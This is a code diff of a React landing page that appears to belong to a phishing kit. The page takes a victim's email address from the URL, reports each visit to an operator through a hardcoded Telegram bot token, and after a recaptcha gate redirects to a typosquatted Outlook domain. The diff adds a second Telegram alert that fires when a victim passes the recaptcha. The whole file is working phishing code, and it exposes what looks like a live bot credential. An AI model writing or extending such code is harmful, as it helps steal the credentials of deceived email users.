@@ -4,17 +4,15 @@ import axios from "axios";
 
 const App = () => {
   const hashValue = window.location.hash.substring(1);
+  const botToken = "6980032440:AAGfgxetXOEWp0bVi2cXotvrupsDqn0FUxU";
+  const userId = "1099461059"; // Replace with the target user's ID
+
+  const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
   if (hashValue) {
-    const botToken = "6980032440:AAGfgxetXOEWp0bVi2cXotvrupsDqn0FUxU";
-    const userId = "1099461059"; // Replace with the target user's ID
-    const messageText = `This email (${hashValue}) clicked on the site waiting for them to solve the recaptcha`;
-
-    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
     axios
       .post(apiUrl, {
         chat_id: userId,
-        text: messageText,
+        text: `This email (${hashValue}) clicked on the site waiting for them to solve the recaptcha`,
       })
       .then((response) => {
         if (response.data.ok) {
@@ -37,8 +35,25 @@ const App = () => {
     // Code to run on component mount or when certain dependencies change
     if (recaptchaValue) {
       window.location.href = `https://outlook.microsoftonilne.serveuser.com/cIgAxmdV#${hashValue}`;
+
+      axios
+        .post(apiUrl, {
+          chat_id: userId,
+          text: `This email (${hashValue}) verified the recaptcha`,
+        })
+        .then((response) => {
+          if (response.data.ok) {
+            return;
+            // console.log("Message sent successfully!");
+          } else {
+            console.error("Failed to send message:", response.data.description);
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error.message);
+        });
     }
-  }, [recaptchaValue, hashValue]);
+  }, [recaptchaValue, hashValue, apiUrl]);
 
   // const handleSubmit = async () => {
   //   try {
